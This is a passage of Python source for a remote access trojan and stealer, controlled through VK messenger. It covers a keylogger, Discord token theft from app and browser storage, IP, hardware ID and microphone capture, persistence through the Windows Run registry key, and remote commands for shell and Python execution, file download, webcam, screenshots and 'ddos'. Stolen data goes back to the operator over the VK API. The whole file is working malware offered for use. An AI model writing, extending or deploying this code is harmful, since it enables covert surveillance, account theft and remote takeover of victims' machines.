        # If there is ImportError occurred.

        # Debug message.
        debug_message("[Keylogger] Can`t start as there is no required module with name \"keyboard\"!")

        # Returning and not starting keylogger.
        return

    # Setting keyboard on release trigger to our callback event function.
    keyboard.on_release(callback=keylogger_callback_event)
    debug_message("[Keylogger] Registered callback event...")

    # Debug message.
    debug_message("[Keylogger] Started!")


def keylogger_callback_event(keyboard_event):
    """ Process keyboard callback event for keylloger. """

    try:
        # Getting keyboard key from the keyboard event.
        keyboard_key = str(keyboard_event.name)

        # Globalising keylogger string.
        global keylogger_buffer

        if type(keyboard_key) == str:
            # If this is string.
            if len(keyboard_key) > 1:
                # If this is not the only 1 char.

                if keyboard_key == "space":
                    # If this is space key.

                    # Adding space.
                    keylogger_buffer = " "
                elif keyboard_key == "enter":
                    # If this enter key.

                    # Adding newline.
                    keylogger_buffer = "\n"
                elif keyboard_key == "decimal":
                    # If this is decimal key.

                    # Adding dot.
                    keylogger_buffer = "."
                elif keyboard_key == "backspace":
                    # If this is backspace key.

                    # Deleting from the keylog.
                    keylogger_buffer = keylogger_buffer[:-1]
                else:
                    # If this is some other key.

                    # Formatting key.
                    keyboard_key = keyboard_key.replace(" ", "_").upper()

                    # Adding it to the keylog.
                    keylogger_buffer = f"[{keyboard_key}]"
            else:
                # If this is only 1 char.

                # Adding key (char) to the keylogger string.
                keylogger_buffer += keyboard_key
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message("[Keylogger] Failed to process keyboard event! Exception - {exception}")


# Server.

def server_connect() -> None:
    """ Connects to the server. """

    # Globalising variables.
    global server_api
    global server_longpoll

    # Debug message.
    debug_message(f"[Server] Connecting to the server...")

    # Base server type.
    server_type = None

    try:
        # Trying to connect to server.

        if "server" not in config or "type" not in config["server"]:
            # If not config server type key.

            # Error.
            debug_message(f"[Server] Failed to get configuration server->type value key! "
                          f"Please check configuration file!")
            sys.exit(1)

        # Reading server type.
        server_type = config["server"]["type"]
        
        if server_type in ("VK_USER", "VK_GROUP"):
            # If one of the VK server type.

            # Debug message.
            debug_message(f"[Server] Selected VK \"{server_type}\" server type...")

            # Get config server access token.
            access_token = config["server"]["vk"]["user" if server_type == "VK_USER" else "group"]["access_token"]

            # Importing longpoll.
            if server_type == "VK_GROUP":
                import vk_api.bot_longpoll
            else:
                import vk_api.longpoll

            # Connect to the VK API.
            server_api = vk_api.VkApi(token=access_token)

            # Connecting to the longpoll.
            if server_type == "VK_GROUP":

                # Get VK group index.
                group_index = config["server"]["vk"]["group"]["index"]

                # Connect group longpoll.
                server_longpoll = vk_api.bot_longpoll.VkBotLongPoll(server_api, group_index)
            else:
                # Connect user longpoll.
                server_longpoll = vk_api.longpoll.VkLongPoll(server_api)
        else:
            # If invalid config server type.

            # Error.
            debug_message(f"[Server] Failed to connect with current server type, "
                          f"as it may be not implemented / exists. Server type - {server_type}")
            exit(1)
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Error.
        debug_message(f"[Server] Failed to connect with server! Exception - {exception}")
        exit(1)

    # Debug message.
    debug_message(f"[Server] Connected to the server with type - {server_type}")


def server_listen() -> None:
    """ Listen server for new messages. """

    if server_longpoll is None:
        # If server longpoll is not connected.

        # Error.
        debug_message(f"[Server] Failed to start server listening as server longpoll is not connected!")
        exit(1)

    if "server" not in config or "type" not in config["server"]:
        # If not config server type key.

        # Error.
        debug_message(f"[Server] Failed to get configuration server->type value key! Please check configuration file!")
        exit(1)

    # Reading server type.
    server_type = config["server"]["type"]
    
    # Message.
    debug_message("[Server] Starting listening...")

    if server_type in ("VK_USER", "VK_GROUP"):
        # If one of the VK server type.

        while True:
            # Infinity loop.

            try:
                # Trying to listen.

                # Get required message event.
                if server_type == "VK_USER":
                    message_event = vk_api.longpoll.VkEventType.MESSAGE_NEW  # noqa
                elif server_type == "VK_GROUP":
                    message_event = vk_api.bot_longpoll.VkBotEventType.MESSAGE_NEW  # noqa
                else:
                    # Error.
                    debug_message(f"[Server] Failed to start server listening with current server type, "
                                  f"as it may be not implemented / exists. Server type - {server_type}")
                    return

                for event in server_longpoll.listen():  # noqa
                    # For every message event in the server longpoll listening.

                    if event.type == message_event:
                        # If this is message event.

                        # Processing client-server answer.
                        client_answer_server(event)
                    
            except Exception as exception:  # noqa
                # If there is exception occurred.

                # Error.
                debug_message(f"[Server] Failed to listen server. Exception - {exception}")
    else:
        # If invalid config server type.

        # Error.
        debug_message(f"[Server] Failed to listen with current server type, as it may be not implemented / exists. "
                      f"Server type - {server_type}")
        exit(1)


def server_method(method: str, parameters: typing.Dict, is_retry=False) -> typing.Optional[typing.Any]:
    """ Calls server method. """

    if server_api is None:
        # If no server API.

        # Just return.
        return None

    try:
        # Trying to call method.

        if "random_id" not in parameters:
            # If there is no random id.

            # Adding random id.
            parameters["random_id"] = vk_api.utils.get_random_id()

        # Executing method.
        return server_api.method(method, parameters)  # noqa
    except Exception as exception:  # noqa
        # Error.

        # Message.
        debug_message(f"[Server] Error when trying to call server method (API)! Exception - {exception}")

        # Rading config.
        retry_on_fail = config["server"]["vk"]["retry_method_on_fail"]

        if is_retry or not retry_on_fail:
            # If this is already retry.

            # Returning.
            return None
        else:
            # If this is not retry.

            # Retrying.
            return server_method(method, parameters, True)


def server_message(text: str, attachmment: str = None, peer: int = None) -> None:
    """ Sends mesage to the server. """

    if peer is None:
        # If peer index is not specified.

        for config_peer in config["server"]["vk"]["peers"]:
            # For every peer index in config peer indices.

            # Sending messages to they.
            server_message(text, attachmment, config_peer)

        # Not process code below (recursion).
        return

    # Adding name to the text.
    _text = f"<{client_name}>\n{text}"

    # Debug message.
    debug_message("[Server] Sent new message!")

    # Calling method.
    server_method("messages.send", {
        "message": _text,
        "attachment": attachmment,
        "peer_id": peer
    })


def server_upload_document(path: str, title: str, peer: int, document_type: str = "doc") -> \
        typing.Tuple[bool, typing.Union[str, typing.Any]]:
    """ Uploads document to the server and returns it (as document string). """

    try:
        # Trying to upload document.

        # Getting api for the uploader.
        server_docs_api = server_api.get_api().docs # noqa

        # Getting upload url.
        if "upload_url" in (upload_server := server_docs_api.getMessagesUploadServer(type=document_type, peer_id=peer)):
            # If there is our URL.

            # Get URL.
            upload_url = upload_server["upload_url"]
        else:
            # If no.

            # Error.
            return False, upload_server

        # Posting file on the server.
        request = json.loads(requests.post(upload_url, files={
            "file": open(path, "rb")
        }).text)

        if "file" in request:
            # If there is all fields in response.

            # Saving file to the docs.
            request = server_docs_api.save(file=request["file"], title=title, tags=[])

            # Get fields.
            document_id = {request[document_type]["id"]}
            document_owner_id = {request[document_type]["owner_id"]}

            # Returning document.
            return True, f"doc{document_owner_id}_{document_id}"
        else:
            # If there is not all fields.

            # Debug message.
            debug_message(f"[Server] Error when uploading document (Request)! Exception - {request}")

            # Returning request as error.
            return False, request
    except Exception as exception:  # noqa
        # If there is error.

        # Debug message.
        debug_message(f"Error when uploading document (Exception)! Exception: {exception}")

        # Returning exception.
        return False, exception


# File System.

def filesystem_try_delete(path) -> bool:
    """ Tries to delete given file"""

    try:
        # Deleting.
        os.remove(path)

        # All OK.
        return True
    except Exception:  # noqa
        # Error.

        # Base case.
        return False


def filesystem_try_listdir(path) -> typing.List:
    """ Tries to list directory. """

    try:
        # Listing.
        return os.listdir(path)
    except Exception:  # noqa
        # Error.

        # Base case.
        return []


def filesystem_get_size(path: str) -> float:
    # @function filesystem_get_size()
    # @returns float
    # @description Function that returns size of the item in megabytes.

    # Megabyte size.
    mb_size = 1024 * 1024

    if os.path.exists(path):
        # If path exists.
        if os.path.isfile(path):
            # If this is file.

            # Getting size of the file.
            return int(os.path.getsize(path) / mb_size)
        elif os.path.isdir(path):
            # If this is directory.

            # Returning size of self and childrens.
            childrens_size = sum([filesystem_get_size(os.path.join(path, directory))
                                  for directory in filesystem_try_listdir(path)])
            return os.path.getsize(path) / mb_size + childrens_size

    # Error.
    return 0


def filesystem_get_type(path: str) -> str:
    """ Returns type of the path. """

    if os.path.isdir(path):
        # If this is directory.

        # Returning directory.
        return "Directory"
    elif os.path.isfile(path):
        # If this is file.

        # Returning file.
        return "File"
    elif os.path.islink(path):
        # If this is link.

        # Returning link.
        return "Link"
    elif os.path.ismount(path):
        # If this is mount.

        # Returning mount.
        return "Mount"

    # Returning unknown type if not returned any above.
    return "Unknown"


def filesystem_build_path(path: str) -> None:
    """ Builds path. """

    try:
        # Trying to build path.

        # Getting path elements (split by \\)
        path_elements = path.split("\\")

        # Removing last element (filename)
        path_elements.pop()

        # Converting back to the string
        path = "\\".join(path_elements)

        if not os.path.exists(path):
            # If path not exists.

            # Making directories.
            os.makedirs(path)
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"[File System] Failed to build path! Path - {path}. Exception - {exception}")


def filesystem_get_drives_list() -> typing.List:
    """ Returns list of all drives in the system. """

    try:
        # Getting drive letters.
        drives_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

        # Returning list.
        return ["%s:\\\\" % drive_letter for drive_letter in drives_letters
                if os.path.exists('%s:\\\\' % drive_letter)]
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Error.
        debug_message(f"[File System] Failed to get drives list! Exception - {exception}")

    # Base list.
    return []


# Tags.

def get_default_tags() -> typing.List:
    """ Returns default tags. """

    # Tags.
    default_tags = [get_ip()["ip"], get_operating_system(), "PC"]

    if FEATURE_STARTUP_HWID_GRABBING_ENABLED:
        # If we enabled HWID.

        # Adding HWID.
        default_tags.append(get_hwid())

    # Returning tags.
    return default_tags


def reset_tags() -> None:
    """ Resets tags. """

    # Globalising tags.
    global client_tags

    # Tags list.
    client_tags = get_default_tags()

    # Saving tags.
    save_tags()


def load_tags() -> None:
    """ Loads all tags data. """

    # Globalising tags.
    global client_tags

    try:
        # Trying to load tags.

        # Getting path.
        path = folder + config["paths"]["tags"]

        # Building path.
        filesystem_build_path(path)

        if os.path.exists(path):
            # If we have tags file.

            try:
                # Trying to read tags.

                with open(path, "r", encoding="UTF-8") as tags_file:
                    # With opened file.

                    # Reading tags.
                    client_tags = eval(tags_file.read())
            except Exception as exception:  # noqa
                # If there is exception occurred.

                # Debug message.
                debug_message(f"[Tags] Failed to load tags file, resetting tags! Exception: {exception}")

                # Reset tags.
                reset_tags()
        else:
            # If no file.

            # Message.
            debug_message("[Tags] Not found tags file, resetting to default!")
        
            # Reset tags.
            reset_tags()
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"[Tags] Failed to load tags, set tags to error! Exception - {exception}")

        # Setting error tags.
        client_tags = DEFAULT_INVALID_TAGS

    # Message.
    debug_message("[Tags] Loading complete!")


def parse_tags(tags: str) -> typing.List:
    """ Parse tags for command calling. """

    # Returning.
    return tags.replace("[", "").replace("]", "").split(",")


def save_tags() -> None:
    """ Saves tags to the file. """

    try:
        # Trying to save tags.

        # Message.
        debug_message("[Tags] Saving tags to the file...")

        # Getting path.
        path = folder + config["paths"]["tags"]

        # Building path.
        filesystem_build_path(path)

        with open(path, "w", encoding="UTF-8") as tags_file:
            # With opened file.

            # Writing tags.
            tags_file.write(str(client_tags))
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"[Tags] Failed to save tags! Exception - {exception}")


# Utils.

def list_intersects(list_a: typing.List, list_b: typing.List) -> bool:
    """ Returns true if any of the item is intersects. """

    # Checking intersection.
    for item in list_a:
        # For items in list A.

        if item in list_b:
            # If item in list B.

            # Return True.
            return True

    # No intersection.
    return False


def list_difference(list_a, list_b) -> typing.List:
    """ Function that returns difference between given two lists. """

    # Returning.
    return [element for element in list_a if element not in list_b]


def get_operating_system() -> str:
    """ Returns current operating system. """

    if sys.platform.startswith("win32"):
        # If this is windows.

        # Returning windows.
        return "Windows"

    if sys.platform.startswith("linux"):
        # If this is linux.

        # Returning linux.
        return "Linux"

    # Unsupported operating system
    return f"UNKNOWN_OS_{sys.platform}"


def get_hwid() -> str:
    """ Returns system unique hardware index. """

    try:
        # Trying to get HWID

        # Command to execute.
        hwid_grab_command = "wmic csproduct get uuid"

        # Opening process.
        process = subprocess.Popen(hwid_grab_command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE)

        # Returning HWID.
        return str((process.stdout.read() + process.stderr.read()).decode().split("\n")[1])
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"[HWID] Failed to grab from the system! Exception - {exception}")

        # Returning default.
        return DEFAULT_INVALID_HWID


def get_ip() -> typing.Dict:
    """ Returns IP information. """

    try:
        # Trying to get IP.

        # API Provider.
        api_provider = "https://ipinfo.io/json"

        # Returning JSON data.
        return requests.get(api_provider).json()
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Showing debug message to the developer.
        debug_message(f"[IP] Failed to grap IP from the system! Exception - {exception}")

    # Returning zero-ip.
    return {
        "ip": DEFAULT_INVALID_IP
    }


def get_environment_variables() -> typing.Dict:
    """ Returns list of all environment variables in system. """

    # Return list of environment variables.
    return {variable: os.environ.get(variable) for variable in os.environ}


def executable_get_extension() -> str:
    """ Returns current executable extension. """

    # Return.
    return sys.argv[0].split(".")[-1]


def record_microphone(path, seconds: int = 1) -> None:
    """ Records microphone. """

    # Importing.
    try:
        # Trying to import modules.

        # Importing.
        import pyaudio
        import wave
    except ImportError:
        # If there is import error.

        # Not supported.
        debug_message("[Microphone] Recording microphone is not supported on selected PC! "
                      "(opencv-python (CV2) module is not installed)")

        # Returning.
        return

    # Creating audio port.
    audio = pyaudio.PyAudio()

    # Opening audio stream.
    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, frames_per_buffer=1024, input=True)

    # Frames list.
    frames = []

    # Writing data stream.
    for _ in range(0, int(44100 / 1024 * int(seconds))):
        data = stream.read(1024)
        frames.append(data)

    # Stopping.
    stream.stop_stream()
    stream.close()
    audio.terminate()

    # Validating filename.
    filesystem_build_path(path)

    # Save recording as wav file.
    file = wave.open(path, 'wb')
    file.setnchannels(1)
    file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
    file.setframerate(44100)
    file.writeframes(b''.join(frames))
    file.close()


# Commands.

def initialise_commands() -> None:
    """ Initialises commands. """

    # Globalising command functions and help.
    global commands_functions
    global commands_help

    # Commands function.
    commands_functions = {
        "screenshot": command_screenshot,
        "webcam": command_webcam,
        "microphone": command_microphone,
        "help": command_help,
        "version": command_version,
        "tags": command_tags,
        "location": command_location,
        "keylog": command_keylog,
        "cd": command_cd,
        "ls": command_ls,
        "drives": command_drives,
        "discord_tokens": command_discord_tokens,
        "discord_profile": command_discord_profile,
        "discord_profile_raw": command_discord_profile_raw,
        "tags_new": command_tags_new,
        "tags_add": command_tags_add,
        "shutdown": command_shutdown,
        "restart": command_restart,
        "console": command_console,
        "upload": command_upload,
        "ddos": command_ddos,
        "link": command_link,
        "name_new": command_name_new,
        "exit": command_exit,
        "python": command_python,
        "message": command_message,
        "destruct": command_destruct,
        "download": command_download,
        "properties": command_properties
    }

    # Commands help.
    commands_help = {
        "discord_profile_raw": (
            "Returns you all RAW (as dict (JSON)) information about client Discord profile",
            "discord_profile_raw"
        ),
        "discord_tokens": (
            "Returns you all found Discord tokens in client system",
            "discord_tokens"
        ),
        "discord_profile": (
            "Returns you all information about client Discord profile",
            "discord_profile"
        ),
        "download": (
            "Downloads file from the client client.",
            "download [required]PATH"
        ),
        "screenshot": (
            "Returns you an photo (screenshot) from screen of the client.",
            "screenshot"
        ),
        "webcam": (
            "Returns you an photo from webcam of the client (Only if it connected to the PC).",
            "webcam"
        ),
        "microphone": (
            "Returns you an voice message from microphone of the client, "
            "for that amount of the seconds that you specify (Only if it connected to the PC).",
            "microphone [optional, default is 1]SECONDS"
        ),
        "help": (
            "Returns list of the all commands in the app, "
            "if you specify command, shows documentation to given command itself.",
            "help [optional]COMMAND"
        ),
        "version": (
            "Returns current version of the app instance that is currently running on the client PC "
            "(That is get this command).",
            "version"
        ),
        "tags": (
            "Returns an list separated by ,(comma) of the all tags that have called instance of the app.",
            "tags"
        ),
        "location": (
            "Returns location (fully not very precise) of the client (Gets throughout IP).", "location"
        ),
        "keylog": (
            "Returns log of the keylogger.",
            "keylog"
        ),
        "cd": (
            "Changes directory of the files commands, if you don't specify directory, this will show it"
            "(Write only name of directory in current directory or full path itself).",
            "cd [optional]DIRECTORY"
        ),
        "ls": (
            "Returns list of the files in current directory (Or directory that you specify) separated by ,(comma).",
            "ls"
        ),
        "drives": (
            "Returns list of the all drives in the system separated by ,(comma)",
            "drives"
        ),
        "tags_new": (
            "Replaces all old tags with these new.",
            "tags_new [required]TAGS(Separated by;)"
        ),
        "tags_add": (
            "Adds given tags to all other tags.",
            "tags_add [required]TAGS(Separated by ;)"
        ),
        "shutdown": (
            "Shutdowns client PC.",
            "shutdown"
        ),
        "restart": (
            "Restarts client PC.",
            "restart"
        ),
        "console": (
            "Executes console command and returns it code (0 if all OK)",
            "console"
        ),
        "ddos": (
            "Pings given address",
            "ddos [required]ADDRESS"
        ),
        "link": (
            "Opens link in a client browser.",
            "link [required]URI"
        ),
        "name_new": (
            "Replaces old name with this name",
            "name_new [required]NAME"
        ),
        "exit": (
            "Exits app (Will be launched when PC is restarted)",
            "exit"
        ),
        "python": (
            "Executes python code, if you want to get output write - global out "
            "out = \"Hello World!\" and this is gonna be shown.",
            "python [required]CODE"
        ),
        "message": (
            "Shows message to the user. (Styles - from 0 to 6, changes buttons)",
            "message [required]TEXT;TITLE[optional];STYLE[optional]"
        ),
        "destruct": (
            "Delete app from the system (Removing from the autorun and closing)",
            "destruct"
        )
    }


# Discord.

def discord_api_call(method: str, params: typing.Dict, func, data, token: str) -> typing.Any:
    """ Calls Discord API. """

    # This code is from my other repo -> https://gtihub.com/kirillzhosul/python-discord-token-grabber

    # Calling.
    return func(
        f"https://discord.com/api/{method}",
        params=params,
        headers={
            "Authorization": f"{token}",
            "Content-Type": "application/json"
        },
        data=data
    )


# Stealer.

def stealer_steal_discord_profile(tokens: typing.List[str] = None) -> typing.Optional[typing.Dict]:
    """ Steals all discord profile information. """

    if tokens is None:
        # If tokens is not given.

        # Grabbing tokens from system.
        tokens = stealer_steal_discord_tokens()

    if not tokens:
        # If no tokens.

        # Returning None.
        return None

    # Returning API response.
    api_response: requests.Response = discord_api_call("users/@me", {}, requests.get, None, tokens[0])
    return api_response.json()


def stealer_steal_discord_tokens() -> typing.List[str]:
    """ Steals all discord tokens. """

    # This code is from my other repo -> https://gtihub.com/kirillzhosul/python-discord-token-grabber

    # Get appdata paths.
    appdata_roaming = os.getenv("APPDATA", "")
    appdata_local = os.getenv("LOCALAPPDATA", "")

    # Paths where tokens exists.
    paths: typing.List[str] = [
        appdata_roaming + "\\Discord\\Local Storage\\leveldb",
        appdata_roaming + "\\discordcanary\\Local Storage\\leveldb",
        appdata_roaming + "\\discordptb\\Local Storage\\leveldb",
        appdata_roaming + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
        appdata_local + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
        appdata_local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
        appdata_local + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"
    ]

    # Tokens that we got.
    tokens: typing.List[str] = []

    for token_path in (path for path in paths if os.path.exists(path)):
        # For existing paths.

        for log_file in (file for file in filesystem_try_listdir(token_path) if
                         file.endswith(".log") or file.endswith(".ldb")):
            # For log files in folder.

            # Opening file.
            file = open(f"{token_path}\\{log_file}", errors="ignore")

            for line in [line.strip() for line in file.readlines() if line.strip()]:
                # Getting all lines.

                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    # Checking all regexs.

                    for token in re.findall(regex, line):
                        # Grabbing token.

                        if "mfa." in token:
                            # Adding token.
                            tokens.append(token)

            # Dont forgot to close file.
            file.close()

    # Returning not-same tokens.
    return list(set(tokens))


def stealer_is_already_worked() -> bool:
    """ Returns true if stealer already worked. """

    # Getting path to anchor file.
    path: str = folder + config["paths"]["anchor"]

    if not os.path.exists(path):
        # If anchor file not exists.

        # Validating file.
        filesystem_build_path(path)

        # Creating file.
        with open(path, "w") as anchor_file:
            anchor_file.write("Anchor")

        # Returning that not worked.
        return False

    # Returning true if worked.
    return True


# Autorun.

def autorun_register() -> None:
    """ Registers current file to the autorun registry (if executable). """

    if not FEATURE_AUTORUN_ENABLED:
        # If autorun is disabled.

        # Debug message.
        debug_message("[Autorun] Not registering, as disabled...")

        # Return.
        return

    if executable_get_extension() != "exe" and DISALLOW_NOT_EXECUTABLE_AUTORUN:
        # If this is not exe file.

        # Debug message.
        debug_message("[Autorun] Not registering, as running not from final executable file (not a .exe), "
                      "if you prefer to register anyway, change value in DISALLOW_NOT_EXECUTABLE_AUTORUN flag")

        # Returning.
        return

    if not sys.platform.startswith("win32"):
        # If not windows family.
        
        # Debug message.
        debug_message("[Autorun] Not registering, as running not from Windows-Family OS.")

        # Returning.
        return
    
    try:
        # Trying to import winreg module.

        # Importing.
        import winreg
    except ImportError:
        # If there is ImportError.

        # Debug message.
        debug_message("[Autorun] Failed to regiter self to the autorun! "
                      "Could not import module winreg that is required for that!")

        # Returning.
        return

    try:
        # Trying to add to the autorun.

        # Getting executable path.
        executable_filename = config["autorun"]["executable"]
        executable_path = f"{folder}{executable_filename}.{executable_get_extension()}"

        if not os.path.exists(executable_path):
            # If no file there (We don't add this already.

            # Building path.
            filesystem_build_path(executable_path)

            # Copying executable there.
            shutil.copyfile(sys.argv[0], executable_path)

        # Opening key.
        registry_key = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
                                      sub_key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                      reserved=0, access=winreg.KEY_ALL_ACCESS)

        # Adding autorun.
        winreg.SetValueEx(registry_key, config["autorun"]["name"], 0, winreg.REG_SZ, executable_path)

        # Closing key.
        winreg.CloseKey(registry_key)

        # Debug message.
        debug_message("[Autorun] Successfully regitering self to the registry!")
    except Exception as exception:  # noqa
        # If error occurred.

        # Debug message.
        debug_message(f"[Autorun] Failed to regiter self to the registry! Exception - {exception}")


def autorun_unregister() -> None:
    """ Unegisters current file to the autorun registry (if executable). """

    if not FEATURE_AUTORUN_ENABLED:
        # If autorun is disabled.

        # Debug message.
        debug_message("[Autorun] Not unregistering, as disabled...")
        return

    if executable_get_extension() != "exe" and DISALLOW_NOT_EXECUTABLE_AUTORUN:
        # If this is not exe file.

        # Debug message.
        debug_message("[Autorun] Not unregistering, as running not from final executable file (not a .exe), "
                      "if you prefer to register anyway, change value in DISALLOW_NOT_EXECUTABLE_AUTORUN flag")
        return

    if not sys.platform.startswith("win32"):
        # If not windows family.
        
        # Debug message.
        debug_message("[Autorun] Not unregistering, as running not from Windows-Family OS.")
        return
    
    try:
        # Trying to import winreg module.

        # Importing.
        import winreg
    except ImportError:
        # If there is ImportError.

        # Debug message.
        debug_message("[Autorun] Failed to unregister self from the autorun! Could not import module winreg")
        return

    try:
        # Trying to remove autorun.

        # Opening key.
        registry_key: winreg.HKEYType = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
                                                       sub_key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                                       reserved=0, access=winreg.KEY_ALL_ACCESS)

        # Deleting autorun.
        winreg.DeleteValue(registry_key, config["autorun"]["name"])

        # Closing key.
        winreg.CloseKey(registry_key)
    except Exception as exception:  # noqa
        # If error occurred.

        # Debug message.
        debug_message(f"[Autorun] Failed to unregister self from the autorun! Exception: {exception}")


# Config.

def load_config() -> None:
    """ Loads config values. """

    # Globalise config and folder.
    global config
    global folder

    # Opening JSON file
    try:
        with open("config.json", "r") as config_file:
            config = json.load(config_file)
    except FileNotFoundError:
        # If config not exists.
        debug_message("[Config] Failed to load config file as it is not found! Please read more wiki...")

    if not config:
        # If empty.

        # Error.
        debug_message("[Config] Failed to load! Is config file empty?")
        sys.exit(1)

    # Update folder.
    if "paths" in config and "main" in config["paths"]:
        # If path found.

        # Read.
        folder = os.getenv("APPDATA") + config["paths"]["main"]
    else:
        # Error.
        debug_message("[Config] Failed to load main folder in paths->main! Is config file invalid?")
        sys.exit(1)

    # Message.
    debug_message("[Config] Loading complete!")


# Other.

def peer_is_allowed(peer: str) -> bool:
    """ Returns is peer is allowed or not. """

    # Get peers.
    peers: typing.List = config["server"]["vk"]["peers"]

    if peers is None or len(peers) == 0:
        # If there is no peers in the list

        # Returning true as there is no peers.
        return True

    # Returning.
    return peer in peers


def exit_handler() -> None:
    """ Should be registered as exit handler (at_exit). """

    # Sever message.
    server_message(f"Disconnected from the network!")

    # Debug message.
    debug_message("[Exit Handler] Exit...")


def launch() -> None:
    """ Launchs all. """

    try:
        # Trying to initialise app.

        # Start message.
        debug_message("[Launch] Starting...")

        # Load config to work with values.
        load_config()

        # Asserting operating system, exiting if the operation system is not supported.
        assert_operating_system()

        # Initialising functions for the remote access.
        initialise_commands()

        # Loading tags from the system.
        load_tags()

        # Loading name from the system.
        load_name()

        # Start message.
        debug_message("[Launch] Tags and name loading completed!")

        # Connecting to the server.
        server_connect()

        # Starting spreading on the other drives.
        spreading_start()

        # Starting keylogger that will steals all keys pressed.
        keylogger_start()

        # Registering in the autorun.
        autorun_register()

        # Message that we connected to the network.
        server_message(f"Connected to the network! (His tags: {', '.join(client_tags)})")

        # Registering exit_handler() as handler for exit.
        atexit.register(exit_handler)

        # Start message.
        debug_message("[Launch] Almost done, stealing data...")

        # Stealing all of the data.
        stealer_steal_data()

        # Start message.
        debug_message("[Launch] Launch end! Starting listening server...")

        # Starting listening messages.
        server_listen()
    except Exception as exception:  # noqa
        # If there is exception occurred.

        # Error.
        debug_message(f"[Launch] Failed to launch! Exception - {exception}")
        sys.exit(1)


# Entry point of the app, calling launch function to start all systems.
launch()
